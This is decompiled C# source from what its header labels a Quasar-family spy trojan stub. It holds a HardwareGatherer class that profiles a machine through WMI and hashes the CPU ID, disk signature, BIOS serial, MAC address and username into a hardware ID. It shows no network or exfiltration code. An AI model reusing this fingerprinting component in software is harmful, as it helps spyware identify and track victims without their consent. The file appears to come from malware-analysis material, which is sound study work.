// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.WMI.HardwareGatherer
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.WMI
{
  public static class HardwareGatherer
  {
    public static ICollection<RamStick> GetRamSticks()
    {
      List<RamStick> ramSticks = new List<RamStick>();
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_PhysicalMemory", new string[5]
      {
        "Capacity",
        "ConfiguredClockSpeed",
        "Manufacturer",
        "SerialNumber",
        "PositionInRow"
      });
      if (instanceClassCollection == null)
        return (ICollection<RamStick>) ramSticks;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        RamStick ramStick = new RamStick((ulong?) wmiInstanceClass["Capacity"].Value, (uint?) wmiInstanceClass["ConfiguredClockSpeed"].Value, (string) wmiInstanceClass["Manufacturer"].Value, (string) wmiInstanceClass["SerialNumber"].Value, (uint?) wmiInstanceClass["PositionInRow"].Value);
        ramSticks.Add(ramStick);
      }
      return (ICollection<RamStick>) ramSticks;
    }

    public static ulong? GetTotalMemoryCapacity()
    {
      ulong? totalMemoryCapacity1 = new ulong?(0UL);
      foreach (RamStick ramStick in (IEnumerable<RamStick>) HardwareGatherer.GetRamSticks())
      {
        ulong? nullable = totalMemoryCapacity1;
        ulong? capacity = ramStick.Capacity;
        totalMemoryCapacity1 = nullable.HasValue & capacity.HasValue ? new ulong?(nullable.GetValueOrDefault() + capacity.GetValueOrDefault()) : new ulong?();
      }
      ulong? totalMemoryCapacity2 = totalMemoryCapacity1;
      ulong num = 0;
      if (!((long) totalMemoryCapacity2.GetValueOrDefault() == (long) num & totalMemoryCapacity2.HasValue))
        return totalMemoryCapacity1;
      totalMemoryCapacity2 = new ulong?();
      return totalMemoryCapacity2;
    }

    public static ICollection<Processor> GetProcessors()
    {
      List<Processor> processors = new List<Processor>();
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_Processor", new string[6]
      {
        "CurrentClockSpeed",
        "CurrentVoltage",
        "Name",
        "Manufacturer",
        "NumberOfCores",
        "ProcessorId"
      });
      if (instanceClassCollection == null)
        return (ICollection<Processor>) processors;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        Processor processor = new Processor((uint?) wmiInstanceClass["CurrentClockSpeed"].Value, (ushort?) wmiInstanceClass["CurrentVoltage"].Value, (string) wmiInstanceClass["Name"].Value, (string) wmiInstanceClass["Manufacturer"].Value, (uint?) wmiInstanceClass["NumberOfCores"].Value, (string) wmiInstanceClass["ProcessorId"].Value);
        processors.Add(processor);
      }
      return (ICollection<Processor>) processors;
    }

    public static BaseBoard GetBaseBoard()
    {
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_Baseboard", new string[6]
      {
        "Model",
        "Product",
        "Name",
        "Manufacturer",
        "SerialNumber",
        "PoweredOn"
      }, "PoweredOn = TRUE");
      if (instanceClassCollection == null || instanceClassCollection.Count == 0)
        return (BaseBoard) null;
      WmiInstanceClass wmiInstanceClass = instanceClassCollection[0];
      return new BaseBoard((string) wmiInstanceClass["Model"].Value, (string) wmiInstanceClass["Product"].Value, (string) wmiInstanceClass["Name"].Value, (string) wmiInstanceClass["Manufacturer"].Value, (string) wmiInstanceClass["SerialNumber"].Value);
    }

    public static ICollection<GraphicsCard> GetGraphicsCards()
    {
      List<GraphicsCard> graphicsCards = new List<GraphicsCard>();
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_VideoController", new string[4]
      {
        "AdapterRAM",
        "Caption",
        "Description",
        "Name"
      });
      if (instanceClassCollection == null)
        return (ICollection<GraphicsCard>) graphicsCards;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        GraphicsCard graphicsCard = new GraphicsCard((uint?) wmiInstanceClass["AdapterRAM"].Value, (string) wmiInstanceClass["Caption"].Value, (string) wmiInstanceClass["Description"].Value, (string) wmiInstanceClass["Name"].Value);
        graphicsCards.Add(graphicsCard);
      }
      return (ICollection<GraphicsCard>) graphicsCards;
    }

    public static uint? GetTotalGpuMemoryCapacity()
    {
      uint? gpuMemoryCapacity1 = new uint?(0U);
      foreach (GraphicsCard graphicsCard in (IEnumerable<GraphicsCard>) HardwareGatherer.GetGraphicsCards())
      {
        uint? nullable = gpuMemoryCapacity1;
        uint? memoryCapacity = graphicsCard.MemoryCapacity;
        gpuMemoryCapacity1 = nullable.HasValue & memoryCapacity.HasValue ? new uint?(nullable.GetValueOrDefault() + memoryCapacity.GetValueOrDefault()) : new uint?();
      }
      uint? gpuMemoryCapacity2 = gpuMemoryCapacity1;
      uint num = 0;
      if (!((int) gpuMemoryCapacity2.GetValueOrDefault() == (int) num & gpuMemoryCapacity2.HasValue))
        return gpuMemoryCapacity1;
      gpuMemoryCapacity2 = new uint?();
      return gpuMemoryCapacity2;
    }

    public static ICollection<HardDrive> GetHardDrives()
    {
      List<HardDrive> hardDrives = new List<HardDrive>();
      WmiInstanceClassCollection instanceClassCollection = WmiInstance.Query("Win32_DiskDrive", new string[4]
      {
        "Caption",
        "Model",
        "Signature",
        "Size"
      });
      if (instanceClassCollection == null)
        return (ICollection<HardDrive>) hardDrives;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        HardDrive hardDrive = new HardDrive((string) wmiInstanceClass["Caption"].Value, (string) wmiInstanceClass["Model"].Value, (uint?) wmiInstanceClass["Signature"].Value, (ulong?) wmiInstanceClass["Size"].Value);
        hardDrives.Add(hardDrive);
      }
      return (ICollection<HardDrive>) hardDrives;
    }

    public static string GetHwid(HwidStrength hwidStrength, bool ignoreNullValues = false)
    {
      string str = (string) null;
      uint? nullable = new uint?();
      foreach (Processor processor in (IEnumerable<Processor>) HardwareGatherer.GetProcessors())
      {
        if (processor.Id != null)
          str = processor.Id;
      }
      foreach (HardDrive hardDrive in (IEnumerable<HardDrive>) HardwareGatherer.GetHardDrives())
      {
        if (hardDrive.Signature.HasValue)
          nullable = hardDrive.Signature;
      }
      string serialNumber = BiosGatherer.GetSerialNumber();
      string activeMacAddress = NetGatherer.GetActiveMacAddress();
      switch (hwidStrength)
      {
        case HwidStrength.Light:
          return ignoreNullValues || str != null ? DataRecoveryHelper.GetMd5Hash(str + Environment.UserName).Replace("-", string.Empty) : (string) null;
        case HwidStrength.Medium:
          return ignoreNullValues || str != null && nullable.HasValue ? DataRecoveryHelper.GetMd5Hash(str + (object) nullable + Environment.UserName).Replace("-", string.Empty) : (string) null;
        case HwidStrength.Strong:
          if (!ignoreNullValues && (str == null || !nullable.HasValue || serialNumber == null || activeMacAddress == null))
            return (string) null;
          return DataRecoveryHelper.GetMd5Hash(str + (object) nullable + serialNumber + activeMacAddress + Environment.UserName).Replace("-", string.Empty);
        default:
          return (string) null;
      }
    }
  }
}
